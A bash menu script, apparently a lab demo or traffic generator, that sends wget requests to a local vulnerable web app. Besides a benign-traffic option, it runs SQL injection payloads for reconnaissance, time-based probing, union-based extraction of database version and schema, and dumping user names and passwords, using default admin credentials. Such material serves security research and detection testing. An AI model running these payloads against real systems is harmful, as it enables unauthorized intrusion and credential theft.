#!/bin/bash
clear

#Ask for the sudo password.
sudo -v
  TITLE="Demo Options"
  PROMPT="pick the number that represents the required option"
echo $TITLE
echo "1) Option 1 - Testing cookie collection."
echo "2) Option 2 - Using the website normally."
echo "3) Option 3 - Running reconaissance attacks."
echo "4) Option 4 - Querying the database semi-effecitively."
echo "5) Option 5 - Egress data from the database semi-effecitively."
echo "6) Option 6 - Egress data from the database successfully (using cookies)."
read case;

#echo You chose $case

case $case in
	1) echo "Testing cookie collection."

	wget --save-cookies cookies.txt --keep-session-cookies --post-data "username=admin&password=password&Login=Login" http://localhost:8080/bhratach/login.php

	sleep 5
	rm cookies.txt
	rm index*
	;;
	2) echo "You chose to use the website normally (i.e. Not Maliciously)."
	echo "Launching standard use"
	echo "Waiting 10 secs to start."
	sleep 10
	for i in {1..36000}
	do
		echo "Accessing Web site normally."
		#Using Attack 58 from CSIT: Vl-VL-N - 9%
		#select a random number between 0 and 5
		j=$(( RANDOM%5+0 ))

		wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=$j#&Submit=Submit#"
		echo "Starting Next Connection: connection No.$i"
		sleep $j
	rm index*
	done
	;;
	3) echo "You chose to run reconnaissance attacks."
	#All attacks will have a probability less than or equal to 36%
	for i in {1..3600}
	do
	echo "Waiting 10 secs to start the attack."
	sleep 10
	for rec in {1..11}
	do
	#Using Attack 1 from CSIT: Vl-VL-NE - 19%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=1')--"
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	sleep 2
	rm index*
	#Using Attack 2 from CSIT: Vl-VL-NE - 19%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=3' or '1"
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	sleep 2
	rm index*
	#Using Attack 124 from CSIT: Vl-VL-NE - 19%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=id=1' and 1"
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	sleep 2
	rm index*
	#Using Attack 58 from CSIT: Vl-VL-N - 9%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=1' and 1 --"
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	sleep 2
	rm index*
	#Using Attack 284 from CSIT: l-L-NE - 29%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or'0'='0--"
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	sleep 2
	rm index*
	#Using Attack 374 from CSIT: l-L-NE - 29%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or'5'='5--"
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	sleep 2
	rm index*
	#Using Attack 446 from CSIT: l-L-NE - 29%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or'10'='10--"
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	sleep 2
	rm index*
	echo "Starting Next Attack"
	#Using Attack 26 from CSIT: Vl-L-SE - 36%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=1 AND 1184=9752"
	sleep 2
	rm index*
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	#Using Attack 102 from CSIT: Vl-L-SE - 36%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%' or 0=0#"
	sleep 2
	rm index*
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	#Using Attack 125 from CSIT: Vl-L-SE - 36%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=id=' order by 3 #&submit=submit"
	sleep 2
	rm index*
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	#Using Attack 98 from CSIT: Vl-L-SE - 36%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=$' or 0=0#"
	sleep 2
	rm index*
	done
	echo "Next Attack sequence is number $i+1"
	 done
	;;
	4) echo "Querying the database semi-effecitively."
	#All attacks will have a probability between 36% and 50%
	echo "Waiting for 10 secs."
	sleep 10
	for rec in {1..1}
	do
	echo "Starting Next Database Attack "
	#Using Attack 130 from CSIT: Vl-L-E - 43%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=id=1' order by i --"
	sleep 2
	rm index*
	echo "Starting Next Database Attack "
	#Using Attack 130 from CSIT: M-L-SE - 50%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=1); SELECT SLEEP(5);#"
	sleep 2
	rm index*
	echo "Starting Next Database Attack "
	#Using Attack 221 from CSIT: M-L-SE - 50%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=id='or'1='1--"
	sleep 2
	rm index*
	echo "Starting Next Database Attack "
	#Using Attack 222 from CSIT: M-L-SE - 50%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=1) RLIKE IF(1537=1537,1,0x28)"
	sleep 2
	rm index*
	echo "Starting Next Database Attack "
	#Using Attack 306 from CSIT: L-L-SE - 50%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=1); WAITFOR DELAY '0:0:5';--"
	sleep 2
	rm index*
	echo "Starting Next Database Attack "
	#Using Attack 330 from CSIT: L-L-SE - 50%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=foo; SELECT SLEEP(5);#"
	sleep 2
	rm index*
	echo "Starting Next Database Attack "
	#Using Attack 490 from CSIT: M-L-SE - 50%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='%20union%20select%20null,%20@@version"
	sleep 2
	rm index*
	echo "Starting Next Database Attack "
	#Using Attack 491 from CSIT: M-L-SE - 50%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='%20union%20select%20null,%20@@hostname"
	sleep 2
	rm index*
	echo "Starting Next Database Attack "
	#Using Attack 132 from CSIT: VL-L-SE - 43%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=union select 1,2,3,4,5,6,7,8,9,0,1/*"
	sleep 2
	rm index*
	done
	;;
  5) echo "Egress data from the database semi-effecitively."
  echo "Waiting 10 secs."
  sleep 10
  echo "Starting Next Database Attack "
  #Using Attack 283 from CSIT: M-H-E - 70%
  wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+where+table_name+like+%27user%25%27%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 259 from CSIT: M-H-E - 70%
  wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28table_name%2C0x0a%2Ccolumn_name%29+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 282 from CSIT: M-H-E - 70%
  wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 283 from CSIT: M-H-E - 70%
  wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+where+table_name+like+%27user%25%27%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 259 from CSIT: M-H-E - 70%
  wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28table_name%2C0x0a%2Ccolumn_name%29+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 282 from CSIT: M-H-E - 70%
  wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 283 from CSIT: M-H-E - 70%
  wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+where+table_name+like+%27user%25%27%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 259 from CSIT: M-H-E - 70%
  wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28table_name%2C0x0a%2Ccolumn_name%29+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 282 from CSIT: M-H-E - 70%
  wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit#"
  sleep 2
  rm index*
  ;;
  6) echo "Egress data from the database successfully (using cookies)."
  echo "Collecting cookies..."
  wget --save-cookies cookies.txt --keep-session-cookies --post-data "username=admin&password=password&Login=Login" http://localhost:8080/bhratach/login.php
  echo "Waiting 10 secs."
  sleep 10
  echo "Starting Next Database Attack "
  #Using Attack 66 from CSIT: M-ML-E - 70%
  wget --load-cookies cookies.txt -p "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+version%28%29+%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 139 from CSIT: ML-ML-E - 70%
  wget --load-cookies cookies.txt -p "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+user%28%29+%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 162 from CSIT: M-MH-E - 70%
  wget --load-cookies cookies.txt -p "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+database%28%29+%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 157 from CSIT: M-M-E - 70%
  wget --load-cookies cookies.txt -p "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+version%28%29+%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 162 from CSIT: M-M-E - 70%
  wget --load-cookies cookies.txt -p "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+user%28%29+%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 257 from CSIT: M-H-E - 70%
  wget --load-cookies cookies.txt -p "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+database%28%29+%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 258 from CSIT: M-M-E - 70%
  wget --load-cookies cookies.txt -p "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 283 from CSIT: M-H-E - 70%
  wget --load-cookies cookies.txt -p "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+where+table_name+like+%27user%25%27%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 259 from CSIT: M-H-E - 70%
  wget --load-cookies cookies.txt -p "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28table_name%2C0x0a%2Ccolumn_name%29+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit#"
  sleep 2
  rm index*
  echo "Starting Next Database Attack "
  #Using Attack 282 from CSIT: M-H-E - 70%
  wget --load-cookies cookies.txt -p "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit#"
  sleep 2
  rm index*
  rm cookies.txt
  ;;
esac
